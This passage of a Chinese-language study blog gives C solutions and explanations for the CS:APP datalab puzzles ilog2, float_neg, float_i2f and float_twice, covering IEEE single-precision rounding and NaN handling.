class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span><br><span class="hljs-comment"> *   Example: ilog2(16) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 90</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ilog2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br><span class="hljs-keyword">int</span> bitsNumber = <span class="hljs-number">0</span>;<br>bitsNumber = (!!(x &gt;&gt; <span class="hljs-number">16</span>)) &lt;&lt; <span class="hljs-number">4</span>;<span class="hljs-comment">//去掉后16位，判断左边16位是否全为0，不是则记录左边16位的最低位索引</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">8</span>)) &lt;&lt; <span class="hljs-number">3</span>);<span class="hljs-comment">//判断左边16位是否全为0，不是则记录左边位8的最低位索引</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">4</span>)) &lt;&lt; <span class="hljs-number">2</span>);<span class="hljs-comment">//</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">2</span>)) &lt;&lt; <span class="hljs-number">1</span>);<span class="hljs-comment">//</span><br>bitsNumber += (!!(x &gt;&gt; (bitsNumber + <span class="hljs-number">1</span>)));<span class="hljs-comment">//</span><br><span class="hljs-keyword">return</span> bitsNumber;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13-float-neg"><a href="#13-float-neg" class="headerlink" title="13.float_neg"></a>13.float_neg</h2><p>返回一个无符号浮点数的负的单精度浮点数表达，参数NaN（阶码全为1，小数域非0）时返回原值</p><p>关键在于NaN的判断，其他参数加上一个符号位即可；</p><p>((uf&gt;&gt;23)&amp;0xff)^0xff判断阶码是否全为1，是的话结果为0，!(uf&amp;((1&lt;&lt;23)-1))判断小数域是否全为0，是的话为1</p><p>所以代码含义就是：</p><p>if(不是NaN)加符号位</p><p>否则返回原参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_neg - Return bit-level equivalent of expression -f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representations of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_neg</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-keyword">if</span>((((uf&gt;&gt;<span class="hljs-number">23</span>)&amp;<span class="hljs-number">0xff</span>)^<span class="hljs-number">0xff</span>)||!(uf&amp;((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">23</span>)<span class="hljs-number">-1</span>))) uf=(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)^uf;<br><br>  <span class="hljs-keyword">return</span> uf;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="14-float-i2f"><a href="#14-float-i2f" class="headerlink" title="14.float_i2f"></a>14.float_i2f</h2><p>将一个int型数转化为浮点型。</p><p>问题重点在于考虑浮点数的舍入</p><ul><li><p>浮点数舍入规则</p><p>如果以形式1.RR..RDD..D表示浮点数（R表示有效位，或保留位，而D表示舍去位），舍入规则就是：</p><p>如果DD..D &lt; 10..0，则向下舍入</p><p>如果DD..D &gt; 10..0，则向上舍入</p><p>如要DD..D = 10..0，则向最近偶数舍入，细则如下 ：</p><p>a. 如果RR..R = XX..0 （最低有效位是0），则向下舍入</p><p>b. 如果RR..R = XX..1（最低有效位是1），则向上舍入</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span><br><span class="hljs-comment"> *   Result is returned as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_i2f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> shiftLeft=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> afterShift, tmp, flag;<br>    <span class="hljs-keyword">unsigned</span> absX=x;<br>    <span class="hljs-keyword">unsigned</span> sign=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//special case</span><br>    <span class="hljs-keyword">if</span> (x==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//if x &lt; 0, sign = 1000...,abs_x = -x</span><br>    <span class="hljs-keyword">if</span> (x&lt;<span class="hljs-number">0</span>)<span class="hljs-comment">//小于0，则取反</span><br>    &#123;<br>sign=<span class="hljs-number">0x80000000</span>;<br>absX=-x;<br>    &#125;<br>    afterShift=absX;<br>    <span class="hljs-comment">//count shift_left and after_shift</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<span class="hljs-comment">//计算阶码E=32-shiftLeft，aftershift保留尾数的值</span><br>    &#123;<br>tmp=afterShift;<br>afterShift&lt;&lt;=<span class="hljs-number">1</span>;<br>shiftLeft++;<br><span class="hljs-keyword">if</span> (tmp &amp; <span class="hljs-number">0x80000000</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">//afterShift的前23位保留作为尾数，要考虑舍入</span><br>    <span class="hljs-keyword">if</span> ((afterShift &amp; <span class="hljs-number">0x01ff</span>)&gt;<span class="hljs-number">0x0100</span>)<span class="hljs-comment">//进位</span><br>flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((afterShift &amp; <span class="hljs-number">0x03ff</span>)==<span class="hljs-number">0x0300</span>)<span class="hljs-comment">//向偶数舍入</span><br>flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>flag=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">return</span> sign +((<span class="hljs-number">127</span>+<span class="hljs-number">32</span>-shiftLeft)&lt;&lt;<span class="hljs-number">23</span>) +(afterShift&gt;&gt;<span class="hljs-number">9</span>) + flag;<br>    <span class="hljs-comment">//符号位+阶码+尾数+舍入值</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-float-twice"><a href="#15-float-twice" class="headerlink" title="15.float_twice"></a>15.float_twice</h2><p>返回一个无符号浮点数的两倍</p><p>对于非规格化数，尾数左移1位就相当于乘2</p><p>对于规格化数，阶码加一即可</p><p>对于NaN，返回原值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_twice</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-keyword">if</span>((uf&amp;<span class="hljs-number">0x7f800000</span>)==<span class="hljs-number">0</span>)  <span class="hljs-comment">//阶码为0，非规格化数</span><br>uf=((uf&amp;<span class="hljs-number">0x007fffff</span>)&lt;&lt;<span class="hljs-number">1</span>)|(uf&amp;<span class="hljs-number">0x80000000</span>);<span class="hljs-comment">//尾数域左移一位，别忘了符号</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((uf&amp;<span class="hljs-number">0x7f800000</span>)!=<span class="hljs-number">0x7f800000</span>) <span class="hljs-comment">//不是NaN ，阶码不是全1 </span><br>uf=uf+<span class="hljs-number">0x800000</span>;<span class="hljs-comment">//阶码+1，2^(1+1)=2*2  </span><br>  <span class="hljs-keyword">return</span> uf;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="测试结果截图"><a href="#测试结果截图" class="headerlink" title="测试结果截图"></a>测试结果截图</h2><p><img src="/2021/07/04/lab2_datalab/image-20210407110327739.png" alt="image-20210407110327739"></p>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
